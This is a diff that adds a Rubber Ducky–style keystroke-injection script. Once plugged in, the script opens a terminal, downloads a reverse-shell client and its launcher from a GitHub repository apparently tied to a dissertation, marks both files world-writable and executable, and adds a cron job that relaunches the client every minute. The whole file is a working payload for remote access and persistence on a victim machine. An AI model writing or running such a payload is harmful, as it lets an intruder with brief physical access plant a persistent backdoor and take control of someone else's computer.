@@ -1,0 +1,23 @@
+DELAY 3000
+CONTROL ALT t
+DELAY 3000
+STRING mkdir -p ~/Artefact/Client
+ENTER
+DELAY 3000
+STRING wget -O ~/Artefact/Client/main.py https://raw.githubusercontent.com/Miosis18/Reverse-Shell-Dissertation/master/Client%20Side/main.py
+ENTER
+DELAY 5000
+STRING wget -O ~/Artefact/Client/start_client.sh https://raw.githubusercontent.com/Miosis18/Reverse-Shell-Dissertation/master/Client%20Side/Autorun/Linux/start_client.sh
+ENTER
+DELAY 5000
+STRING chmod 777 ~/Artefact/Client/main.py
+ENTER
+DELAY 3000  
+STRING chmod 777 ~/Artefact/Client/start_client.sh
+ENTER
+DELAY 3000 
+STRING (crontab -l 2>/dev/null; echo "*/1 * * * * ~/Artefact/Client/start_client.sh") | crontab -
+ENTER
+DELAY 3000
+STRING exit
+ENTER
